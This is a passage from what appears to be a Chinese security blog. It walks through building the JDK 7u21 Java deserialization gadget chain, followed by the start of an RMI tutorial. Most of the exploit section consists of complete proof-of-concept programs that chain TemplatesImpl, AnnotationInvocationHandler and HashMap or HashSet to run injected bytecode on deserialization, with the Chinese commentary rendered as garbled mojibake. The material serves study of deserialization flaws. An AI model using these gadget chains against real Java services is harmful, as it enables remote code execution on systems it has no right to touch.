34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚çœ‹äº†ä¸€ä¸‹ï¼Œç¡®å®æ˜¯åºåˆ—åŒ–ä¹‹å‰é€ æˆçš„ï¼ŒHashMapçš„put()ä¼šè°ƒç”¨ï¼Œè€ç”Ÿå¸¸è°ˆäº†ï¼š è§£å†³æ–¹æ³•å°±æ˜¯å°†æœ€å¼€å§‹åŠ å…¥templatesImplç±»å®ä¾‹çš„åœ°æ–¹ä¸è¦åŠ å…¥ï¼Œè®©hashå€¼ç›´æ¥ä¸ç›¸åŒï¼š\næ”¹æˆä¸‹é¢çš„POCè¯•è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); //è¿™ä¸ªä¸èƒ½åˆ ï¼Œå†è°ƒç”¨ä¸€æ¬¡ä¿®æ”¹å€¼å³å¯ hashMap.put(\u0026#34;f5a5a608\u0026#34;,\u0026#34;fupanc\u0026#34;); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿˜æ˜¯ä¸è¡Œï¼Œçœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œè¯´æ˜¯åœ¨æœ€åçš„HashMapä¸­æ”¾å…¥ctfå’Œproxyæ—¶è°ƒæ¢ä¸€ä¸‹ä½ç½®å³å¯ï¼Œå³å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿è¡Œè°ƒè¯•åå‘ç°ç¡®å®æ˜¯ååºåˆ—åŒ–æ—¶å¼¹å‡ºæ¥çš„è®¡ç®—æœºï¼Œå¹¶ä¸”åœ¨åºåˆ—åŒ–ä¹‹å‰ä¹Ÿæ²¡æœ‰å¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”\nåé¢æƒ³äº†ä¸€ä¸‹ï¼Œè¿™æ ·ä¸å°±ä¸ä¹‹å‰åˆ†æçš„ä¸ä¸€æ ·äº†å—ã€‚ç™¾æ€ä¸å¾—å…¶è§£ã€‚\nç„¶åå°±ä¸€ç›´è°ƒè¯•ï¼Œæœ€ååœ¨å‘ç°ï¼Œå®åœ¨ååºåˆ—åŒ–æ—¶å‡ºç°äº†é—®é¢˜ã€‚\nHashMapååºåˆ—åŒ–æ—¶çš„é—®é¢˜ï¼š\nä»ä»£ç ä¸­å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªæ”¾å…¥é”®å€¼å¯¹çš„åœ°æ–¹ï¼Œä½†æ˜¯æˆ‘æƒ³å½“ç„¶åœ°æƒ³ç€è¿™é‡Œä¼šæŒ‰ç…§é¡ºåºæ¥æ”¾å…¥é”®å€¼å¯¹ï¼Œè°ƒè¯•å¦‚ä¸‹ï¼ˆä»¥ä¸Šé¢æ­£ç¡®çš„ä»£ç ä¸ºä¾‹ï¼‰ï¼š\nå…ˆæ”¾å…¥çš„é”®å€¼å¯¹å¦‚ä¸‹ï¼š\nç„¶åç»§ç»­å†ä¸€æ¬¡æ–­äºè¿™ä¸ªç‚¹ï¼Œæ”¾å…¥çš„é”®å€¼å¯¹å¦‚ä¸‹ï¼š\nä¹Ÿå°±æ˜¯proxyä¸­å­˜åœ¨çš„hashMapã€‚\nç„¶åç»§ç»­å†ä¸€æ¬¡æ–­äºè¿™ä¸ªç‚¹ï¼Œé”®å€¼å¯¹å¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹åˆ°æœ€åæ‰æ˜¯è¿™ä¸ªproxyï¼Œè€Œæˆ‘ä»¬çš„æ”¾å…¥çš„æ“ä½œä¸ºï¼š æ˜¯å…ˆæ”¾å…¥çš„proxyå†æ”¾å…¥çš„ctfï¼Œä½†æ˜¯è¿™é‡Œçš„ååºåˆ—åŒ–æ—¶çš„é¡ºåºæ˜¯ä¸ä¸€æ ·çš„ï¼Œæˆ‘ä»¬æƒ³åˆ©ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\næ‰€ä»¥æ˜¯éœ€è¦keyä¸ºproxyä»£ç†å¯¹è±¡çš„ï¼Œä½†æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é¡ºåºæ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å…ˆæ”¾å…¥proxyï¼Œåæ”¾å…¥ctfï¼Œè¿™æ ·ï¼Œä¹Ÿå°±ä¸ä¼šå¯¼è‡´åºåˆ—åŒ–ä¹‹å‰çš„å¼¹è®¡ç®—æœºäº†ã€‚\nå¦‚æœæŒ‰ç…§ä¹‹å‰çš„é¡ºåºï¼Œé‚£ä¹ˆç¡®å®æ˜¯ä¼šåœ¨åºåˆ—åŒ–ä¹‹å‰å¼¹å‡ºè®¡ç®—æœºï¼Œç¬¦åˆå¼¹è®¡ç®—æœºçš„æ¡ä»¶ã€‚\nä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ï¼ŒHashMapçš„é¡ºåºå°±æ˜¯ hashMapé‡Œçš„é”®å€¼å¯¹ ==ã€‹hashä¸­çš„proxy é”®å€¼å¯¹ ==\u0026gt;hashä¸­çš„ctf(TemplatesImplé”®å€¼å¯¹)ã€‚å¹¶ä¸”è°ƒè¯•åä¹Ÿç¬¦åˆæƒ…å†µã€‚\nç„¶åæˆ‘åœ¨JDK8ä¹Ÿè¯•äº†ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å…ˆååºåˆ—åŒ–çš„ç¬¬äºŒä¸ªé”®å€¼å¯¹ï¼Œä½†æ˜¯æµ‹è¯•çš„é”®å€¼å¯¹éƒ½æ˜¯ä»¥ä¸€ä¸ªç±»å®ä¾‹ä¸ºkeyï¼Œé—®äº†ä¸€ä¸‹ï¼ŒåŸå› å¤§æ¦‚å¦‚ä¸‹ï¼š\nè¿™ä¸ªæ˜¯å› ä¸ºHashMapåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶æœ¬èº«å…¶é¡ºåºå°±å¯èƒ½ä¸åŒï¼Œå…¶é¡ºåºæ—¶åŸºäºå“ˆå¸Œå€¼æ¥å†³å®šçš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯èƒ½å°±ä¸ç¯å¢ƒæœ‰å…³äº†ã€‚ä¹Ÿè®¸åœ¨æŸä¸ªç¯å¢ƒæˆ‘æœ€å¼€å§‹çš„é‚£ä¸ªå…ˆæ”¾å…¥fupancå†ä¿®æ”¹ä¸ºctfçš„æ–¹æ³•ä¹Ÿæ˜¯æœ‰ç”¨çš„å‘¢ï¼ˆåæ­£åˆšå­¦çš„æ—¶å€™åº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œå†é‡çœ‹çš„æ—¶å€™ä¸è¡Œäº†ï¼‰ã€‚åæ­£å¤šè¯•ã€‚\nä¸ºäº†éªŒè¯æƒ³æ³•ï¼Œä½¿ç”¨å¦‚ä¸‹POCæ¥éªŒè¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.HashMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ // TemplatesImpl ctf = new TemplatesImpl(); // // HashMap hashMap = new HashMap(); HashMap hash = new HashMap(); hash.put(\u0026#34;fupanc1\u0026#34;,111); hash.put(\u0026#34;fupanc2\u0026#34;,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±æ˜¯å…ˆæ”¾å…¥çš„ç¬¬ä¸€ä¸ªï¼Œå†æ”¾å…¥çš„ç¬¬äºŒä¸ªã€‚\nâ€”â€”â€”â€”â€”â€”\nåŸºäºç°åœ¨çš„æƒ…å†µï¼Œé‚£ä¹ˆç°åœ¨åºåˆ—åŒ–å‰çš„æµç¨‹è‚¯å®šä¹Ÿè¦å˜ï¼Œç®€å•è·Ÿä¸€ä¸‹ï¼š è¿˜æ˜¯ç›´æ¥æ–­äºhashä¸­ç¬¬äºŒæ¬¡æ”¾å…¥é”®å€¼å¯¹çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š\nå¯ä»¥çŸ¥é“è¿™é‡Œçš„hashå€¼æ—¶è‚¯å®šç›¸åŒçš„ï¼Œå…·ä½“æµç¨‹å’Œä¹‹å‰åˆ†æçš„ä¸ä¸€æ ·ï¼Œä½†æ˜¯æ­¤æ—¶çš„è°ƒç”¨equals()æ–¹æ³•å°±æœ‰åŒºåˆ«äº†ï¼Œè¿™é‡Œçš„TemplatesImplç±»æ²¡æœ‰å®šä¹‰equals()æ–¹æ³•ï¼Œè¿™é‡Œä¼šç›´æ¥è°ƒç”¨åˆ°Object.javaç±»çš„equals()æ–¹æ³•ï¼š\nä»å˜é‡çš„å€¼æ¥çœ‹ï¼Œè¿™é‡Œæ˜¯ä¼šè¿”å›falseçš„ï¼Œç„¶åç›´æ¥å°±ä¼šæˆåŠŸæ”¾å…¥ç¬¬äºŒä¸ªé”®å€¼å¯¹ã€‚\næ‰€ä»¥æœ€ç»ˆçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } HashSet HashSetæœ¬æ¥å°±å’ŒHashMapå·®ä¸å¤šï¼Œå¹¶ä¸”ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯å…ˆååºåˆ—åŒ–çš„ç¬¬äºŒä¸ªé”®å€¼å¯¹ã€‚readObjectå†…å®¹ä¸ºï¼š\nå¯ä»¥çœ‹åˆ°å…¶å®å°±æ˜¯è°ƒç”¨çš„HashMapçš„put()æ–¹æ³•ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å‰é¢åˆ†æè¿‡äº†çš„ï¼Œæœ€ç»ˆPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashSet hash = new HashSet(); hash.add(proxy); hash.add(ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸåœ¨ååºåˆ—åŒ–æ—¶å¼¹è®¡ç®—æœºã€‚\nå…¶å®åœ¨å¯ä»¥åˆ©ç”¨equals()æ–¹æ³•çš„åœ°æ–¹ï¼Œåªè¦JDKç‰ˆæœ¬ç¬¦åˆ \u0026lt;= 7u21 ï¼Œéƒ½è¦æƒ³åˆ°è¿™ä¸ªåŸç”Ÿé“¾ï¼Œæ¯”å¦‚ROMEé“¾çš„ç¬¬ä¸‰æ¡å°±æœ‰ç”¨åˆ°equals()æ–¹æ³•ï¼Œå¤§åŒå°å¼‚ã€‚\n","date":"2024-10-11T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/jdk-7u21/","title":"JDK 7u21"},{"content":"RMI RMIå…¨ç§°æ˜¯Remote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚è¿™ç§æ€æƒ³å…¶å®æ˜¯å’ŒCè¯­è¨€çš„RPCç±»ä¼¼çš„ã€‚åœ¨è¿™é‡Œçš„RMIæ˜¯Javaç‹¬æœ‰çš„ä¸€ç§æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è®©æŸä¸ªjavaè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªjavaè™šæ‹Ÿæœºä¸­å¯¹è±¡ä¸Šçš„æ–¹æ³•ã€‚\nå…·ä½“æ€æƒ³å°±æ˜¯è®©æˆ‘ä»¬è·å–è¿œç¨‹ä¸»æœºä¸Šå¯¹è±¡çš„å¼•ç”¨ï¼Œæˆ‘ä»¬è°ƒç”¨è¿™ä¸ªå¼•ç”¨å¯¹è±¡ï¼Œä½†å®é™…æ–¹æ³•çš„æ‰§è¡Œåœ¨è¿œç¨‹æœåŠ¡ç«¯ä¸Šã€‚\nRMIæ¶æ„ ä»RMIè®¾è®¡è§’åº¦æ¥è®²ï¼ŒåŸºæœ¬åˆ†ä¸ºä¸‰å±‚æ¶æ„æ¥å®ç°RMIï¼Œåˆ†åˆ«ä¸ºRMIæœåŠ¡ç«¯ï¼ŒRMIå®¢æˆ·ç«¯å’ŒRMIæ³¨å†Œä¸­å¿ƒã€‚ï¼ˆä½†æ˜¯å…¶å®æœåŠ¡ç«¯å’Œæ³¨å†Œä¸­å¿ƒæ˜¯å¯ä»¥æ”¾åœ¨ä¸€èµ·çš„ï¼‰\nClient-å®¢æˆ·ç«¯ï¼šå®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡ç«¯çš„æ–¹æ³• Server-æœåŠ¡ç«¯ï¼šè¿œç¨‹è°ƒç”¨æ–¹æ³•å¯¹è±¡çš„æä¾›è€…ï¼Œä¹Ÿæ˜¯ä»£ç çœŸæ­£æ‰§è¡Œçš„åœ°æ–¹ï¼Œæ‰§è¡Œç»“æŸä¼šè¿”å›ç»™å®¢æˆ·ç«¯æ–¹æ³•æ‰§è¡Œçš„ç»“æœ Registry-æ³¨å†Œä¸­å¿ƒ Stub å’Œ Skeletonï¼š\nRMIå¼•å…¥äº†ä¸¤ä¸ªæ¦‚å¿µï¼Œåˆ†åˆ«æ˜¯Stubsï¼ˆå®¢æˆ·ç«¯å­˜æ ¹ï¼‰ä»¥åŠSkeletonsï¼ˆæœåŠ¡ç«¯éª¨æ¶ï¼‰ï¼Œå½“å®¢æˆ·ç«¯ï¼ˆClientï¼‰è¯•å›¾è°ƒç”¨ä¸€ä¸ªè¿œç«¯çš„Objectï¼Œå®é™…è°ƒç”¨çš„æ˜¯å®¢æˆ·ç«¯æœ¬åœ°çš„ä¸€ä¸ªä»£ç†ç±»ï¼ˆProxyï¼‰ï¼Œè¿™ä¸ªä»£ç†ç±»å°±ç§°ä¸º Stubï¼Œè€Œåœ¨è°ƒç”¨æœåŠ¡ç«¯ï¼ˆServerï¼‰çš„ç›®æ ‡ç±»ä¹‹å‰ï¼Œä¹Ÿä¼šç»è¿‡ä¸€ä¸ªå¯¹åº”çš„è¿œç«¯ä»£ç†ç±»ï¼Œå°±æ˜¯Skeletonï¼Œå®ƒä»Stubä¸­æ¥æ”¶è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶ä¼ é€’ç»™çœŸå®çš„ç›®æ ‡ç±»ã€‚Stubs ä»¥åŠ Skeletonçš„è°ƒç”¨å¯¹äº RMIæœåŠ¡çš„ä½¿ç”¨è€…æ¥è®²æ˜¯éšè—çš„ã€‚\næ—¶åºå›¾å¦‚ä¸‹ï¼š\nè¿˜æ˜¯æ¯”è¾ƒæ¸…æ¥šçš„ã€‚\nåŸºæœ¬æµç¨‹å­¦ä¹  æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 è°ƒç”¨å¯¹è±¡å¦‚ä½•å®šä¹‰ ä½¿ç”¨RMIï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªèƒ½å¤Ÿè¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£å¿…é¡»æ‰©å±•java.rmi.Remoteæ¥å£ï¼Œç”¨äºè¡¨ç¤ºå¯ä»¥ä»éæœ¬åœ°è™šæ‹Ÿæœºè°ƒç”¨å…¶æ–¹æ³•ï¼Œæ‰€ä»¥è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡å¿…é¡»å®ç°è¿™ä¸ªæ¥å£ã€‚å…¶æ¬¡è¿™ä¸ªæ¥å£çš„æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»å£°æ˜æŠ›å‡ºjava.rmi.RemoteExceptionå¼‚å¸¸ï¼Œå¦‚ä¸‹å®ä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 package Rmi.Server; import java.rmi.Remote; import java.rmi.RemoteException; public interface RemoteInterface extends Remote { public String sayHello() throws RemoteException; public String sayName(Object name) throws RemoteException; } éšåå°±å¯ä»¥æ¥åˆ›å»ºè¿™ä¸ªè¿œç¨‹æ¥å£çš„å®ç°ç±»ï¼Œè¿™ä¸ªç±»é€šå¸¸ä¼šæ‰©å±•java.rmi.server.UnicastRemoteObjectç±»ï¼Œæ‰©å±•æ­¤ç±»åï¼ŒRMIä¼šè‡ªåŠ¨å°†è¿™ä¸ªç±» è¾“å‡ºï¼ˆexportï¼‰ ç»™è¿œç¨‹æƒ³è¦è°ƒç”¨å®ƒçš„ Client ç«¯ï¼ˆæ³¨å†Œä¸­å¿ƒï¼Ÿï¼‰ã€‚è¿™é‡Œå¿…é¡»ä¸ºè¿™ä¸ªå®ç°ç±»æä¾›ä¸€ä¸ªæ„é€ å‡½æ•°å¹¶ä¸”æŠ›å‡º RemoteExceptionã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package Rmi.Server; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RemoteTest extends UnicastRemoteObject implements RemoteInterface { protected RemoteTest() throws RemoteException{ } public String sayHello() throws RemoteException{ return \u0026#34;Hello welcome to use\u0026#34;; } public String sayName(Object name) throws RemoteException{ return \u0026#34;hello\u0026#34;+name; } } å¦‚æœä¸è®©è¿œç¨‹å¯¹è±¡æˆä¸º UnicastRemoteObject çš„å­ç±»ï¼Œåé¢å°±éœ€è¦è‡ªå·±æ‰‹åŠ¨ä½¿ç”¨UnicastRemoteObjectçš„é™æ€æ–¹æ³•exportObjectæ¥æ‰‹åŠ¨ export å¯¹è±¡ã€‚\nå¦‚ä½•è°ƒç”¨ å‰é¢å°±å·²ç»åˆ›å»ºå¥½äº†å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡ã€‚å¦‚ä½•è°ƒç”¨å‘¢ã€‚Java RMI æ¶‰åŠäº†ä¸€ä¸ª Registry çš„æ€æƒ³ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨æ¥æŸ¥æ‰¾ä¸€ä¸ªè¿œç«¯å¯¹è±¡çš„å¼•ç”¨ã€‚\nå¦‚ä½•ç†è§£ï¼Œå¯ä»¥å°†Registryç†è§£ä¸º RMIç”µè¯æœ¬ï¼Œå½“æˆ‘ä»¬æƒ³è¦åœ¨æŸä¸ªäººé‚£é‡Œè·å–ä¿¡æ¯æ—¶ï¼ˆRemote Method Invocationï¼‰ï¼Œæˆ‘ä»¬åœ¨ç”µè¯æœ¬ä¸Šï¼ˆRegistryï¼‰é€šè¿‡è¿™ä¸ªäººçš„åç§°ï¼ˆNameï¼‰æ¥æ‰¾åˆ°è¿™ä¸ªäººçš„ç”µè¯å·ç 